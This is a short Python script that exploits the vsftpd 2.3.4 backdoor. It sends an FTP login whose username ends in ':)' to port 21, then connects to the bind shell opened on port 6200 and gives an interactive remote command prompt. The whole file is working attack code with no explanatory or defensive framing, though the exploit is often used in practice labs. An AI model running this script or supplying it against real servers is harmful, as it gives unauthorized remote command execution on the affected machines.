from socket import socket


def connect(s, addr, port):
    s.connect((addr, port))
    s.sendall(b"USER smiley:)\r\n")
    s.recv(2048)
    s.sendall(b"PASS smiley\r\n")
    s.recv(2048)


def shell_connect(s, addr, port):
    s.connect((addr, port))


def shell_prompt(s):
    s.sendall(b"hostname\n")
    hostname = s.recv(2048).decode()
    s.sendall(b"whoami\n")
    whoami = s.recv(2048).decode()
    s.sendall(b"pwd\n")
    pwd = s.recv(2048).decode()
    return f"{whoami.strip()}@{hostname.strip()} {pwd.strip()}: "


def shell_command(s, cmd):
    s.sendall(cmd.encode() + b'\n')
    response = s.recv(2048).decode()
    return response


def shell(s):
    try:
        while True:
            cmd = input(shell_prompt(s))
            print(shell_command(s, cmd), end='')
    except KeyboardInterrupt:
        return
    except Exception as e:
        print(e)
        return


if __name__ == "__main__":
    from argparse import ArgumentParser
    parser = ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("--port", type=int, default=21)
    parser.add_argument("--shellport", type=int, default=6200)
    args = parser.parse_args()
    with socket() as s:
        connect(s, args.host, args.port)
    with socket() as sh:
        shell_connect(sh, args.host, args.shellport)
        shell(sh)
